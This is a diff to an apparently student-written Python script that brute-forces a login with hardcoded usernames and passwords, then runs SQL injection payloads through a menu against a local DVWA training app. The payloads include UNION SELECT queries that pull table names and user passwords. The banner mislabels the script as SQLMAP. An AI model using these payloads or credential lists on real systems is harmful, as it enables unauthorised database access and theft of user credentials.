@@ -2,6 +2,13 @@ import mechanize
 import re
 import requests
 from requests.utils import requote_uri
+
+print("\n\n**************************************************************************************************")
+print("*\t\t\t\t      ------SQLMAP------\t\t\t\t\t *")
+print("*\t\t\t\t\t\t\t\t\t\t\t\t *\n* SQLMAP is an open source penetration testing tool on command prompt that automates the process *\n* of detecting and exploiting SQL injection flaws and taking over of database servers.\t\t *")
+print("*\t\t\t\t\t\t\t\t\t\t\t\t *\n**************************************************************************************************")
+
+
 admin_list=['user','','mayirp','rihim','admin','tima','ssb']
 pass_list=['user0','abcd@123','pass123','password']
 
@@ -72,11 +79,19 @@ print(cookie_dict)
 ##
 
 #sql injection code
-injects=["'","1'","500' OR 1='1","1' OR 1 = 1 UNION SELECT NULL, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES#"]
+injects=["1'","'","500' OR 1='1","1' OR 1 = 1 UNION SELECT NULL, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES#","1' OR 1 = 1 UNION SELECT user, password FROM users#"]
 
-flag=0
-for inj in injects:
-        print("______________________________________________________________________________________________________________________________________\n")
+print("\n\n********* MENU *********\n1. Vulnerability check\n2. Database Name\n3. User's Data\n4. Table Name\n5. Data from User Table\n6. Exit")
+op=int(input("Enter Your Option: "))
+while op!=6:
+        if op<1 or op>6:
+                print("Enter correct input")
+                print("********* MENU *********\n1. Vulnerability check\n2. Database Name\n3. User's Data\n4. Table Name\n5. Data from User Table\n6. Exit")
+                op=int(input("Enter Your Option: "))
+                continue
+        flag=0
+        inj=injects[op-1]
+        
         print("Checking ",inj)
         br.open("http://localhost/DVWA-master/vulnerabilities/sqli/")
         br.select_form(nr=0)
@@ -101,7 +116,6 @@ for inj in injects:
                         print("-----------------------------------------DATABASE Name and Version-----------------------------------------")
                         print("| ",content[beg:end]," |")
                         print("-----------------------------------------------------------------------------------------------------------")
-                        continue
 
         beg = [m.start() for m in re.finditer('<pre>',content)]
         end = [m.start() for m in re.finditer('</pre>',content)]
@@ -109,9 +123,11 @@ for inj in injects:
         for i in range(len(beg)):
                 print("| ",content[beg[i]:end[i]])
 
-if flag==0:
-        print("Not Vulnerable")
-
+        if flag==0:
+                print("Not Vulnerable")
+        print("______________________________________________________________________________________________________________________________________\n")
+        print("\n********* MENU *********\n1. Vulnerability check\n2. Database Name\n3. User's Data\n4. Table Name\n5. Data from User Table\n6. Exit")
+        op=int(input("Enter Your Option: "))
 
 print("\n Exploitation and detection of SQL vulnerabiities program by:")
 print("--------------------------")
